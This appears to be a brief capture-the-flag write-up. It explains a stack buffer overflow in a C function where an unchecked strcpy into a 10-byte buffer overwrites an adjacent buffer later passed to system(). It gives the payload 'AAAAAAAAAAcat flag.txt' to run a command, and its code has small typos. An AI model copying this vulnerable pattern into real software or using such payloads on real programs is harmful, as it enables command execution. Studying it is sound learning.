void fun(char name, charcmd) {
    char c[10];
    char buffer[10];

    strcpy(c, cmd);
    strcpy(buffer, name);

    printf("Goodbye, %s!\n", buffer);
    fflush(stdout);
    system(c);
}
strcpy(c, cmd); & fun(name, "uname");
+c= uname
    strcpy(buffer, name);
+this is for the overflow
    system(c);
+ this run whatever you put in C
char c[10];
    char buffer[10];
as you can see, there two stack buffer, which 10 bytes
each
and the strcpy(buffer, name);
will copy all user input into buffer without checking the size


AAAAAAAAAAcat flag.txt


the first 10 A is the buffer
cat flag.txt is the overwrite
